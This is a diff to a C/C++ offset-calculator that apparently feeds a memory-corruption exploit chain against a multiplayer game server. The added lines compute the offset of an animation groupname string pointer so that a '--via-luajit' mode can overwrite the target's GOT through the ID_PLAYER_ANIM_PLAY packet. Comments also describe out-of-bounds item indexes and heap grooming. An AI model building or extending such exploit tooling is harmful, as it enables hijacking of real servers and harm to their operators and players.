@@ -40,6 +40,11 @@ int main(int argc, char **argv)
     // Animation leads with a std::string groupname, so mode sits 32 bytes in. Anchoring the check
     // on `animation` alone is off by exactly that string and rejects a layout that is in fact fine.
     const size_t animmode = offsetof(BasePlayer, animation) + offsetof(Animation, mode);
+    // Animation leads with a 32-byte std::string groupname, so offsetof(BasePlayer, animation) is
+    // also &animation.groupname._M_p. --via-luajit poisons the target GOT through that string,
+    // because ID_PLAYER_ANIM_PLAY assigns it and its processor calls no Lua callback -- the one
+    // write path in the chain that does not spend the hijacked slot on a callback name.
+    const size_t animgrp  = offsetof(BasePlayer, animation);
 
     int rc = 0;
     // An out-of-bounds index i puts Item[i].count|charge at equip + stride*i + coff. For a field to
@@ -90,6 +95,7 @@ int main(int argc, char **argv)
     // Recorded so the profile states WHY index leak_self_idx is survivable, rather than leaving it
     // as a bare number that happens to work.
     printf("groom_off      = %#zx   # animation.mode, settable via ID_PLAYER_ANIM_PLAY\n", animmode);
+    printf("anim_group_off = %#zx   # &animation.groupname._M_p, the --via-luajit write path\n", animgrp);
     fprintf(stderr, "ok: sizeof(BasePlayer)=%zu equip=%zu stride=%zu heap_idx=%zu self_idx=%zu\n",
             sizeof(BasePlayer), equip, stride, heap_idx, self_idx);
     return 0;
